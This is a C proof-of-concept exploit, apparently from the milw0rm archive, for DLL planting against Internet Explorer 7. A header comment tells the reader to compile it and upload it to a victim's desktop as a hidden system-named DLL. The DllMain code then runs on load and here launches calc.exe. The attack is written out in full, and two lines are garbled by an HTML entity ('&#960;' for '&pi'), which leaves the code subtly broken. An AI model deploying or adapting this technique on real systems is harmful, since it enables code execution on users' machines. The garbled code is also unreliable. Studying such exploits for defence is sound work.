/*
        Copyright (C) 2006-2007 Aviv Raff
        http://aviv.raffon.net
        Greetz: hdm, L.M.H, str0ke, SkyLined

        Compile and upload to the victim's desktop as one of the following hidden DLL files:
        - sqmapi.dll
        - imageres.dll
        - schannel.dll

        Run IE7 and watch the nice calculators pop up.
        Filter fdwReason to execute only once.

        Tested on WinXP SP2 with fully patched IE7.
        For testing/educational purpose only!

*/


#include <windows.h>

BOOL WINAPI DllMain(
  HINSTANCE hinstDLL,
  DWORD fdwReason,
  LPVOID lpvReserved
)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    TCHAR windir[_MAX_PATH];
    TCHAR cmd[ _MAX_PATH ];
    GetEnvironmentVariable("WINDIR",windir,_MAX_PATH );
    wsprintf(cmd,"%s\\system32\\calc.exe",windir);
    ZeroMemory(&si,sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&#960;,sizeof(pi));
    CreateProcess(NULL,cmd,NULL,NULL,FALSE,0,NULL,NULL,&si,&#960;);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

// milw0rm.com [2006-12-14]
